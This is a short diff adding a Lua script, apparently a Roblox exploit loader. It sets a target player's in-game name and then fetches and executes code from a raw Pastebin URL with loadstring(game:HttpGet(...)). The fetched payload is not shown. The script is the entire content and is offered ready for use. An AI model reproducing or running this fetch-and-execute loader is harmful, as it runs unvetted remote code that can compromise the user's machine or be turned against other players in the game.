@@ -1,0 +1,3 @@
+_G.Name = "abdbytrpy" -- Insert Players In game name
+
+loadstring(game:HttpGet("https://pastebin.com/raw/kFrZULQ7"))()
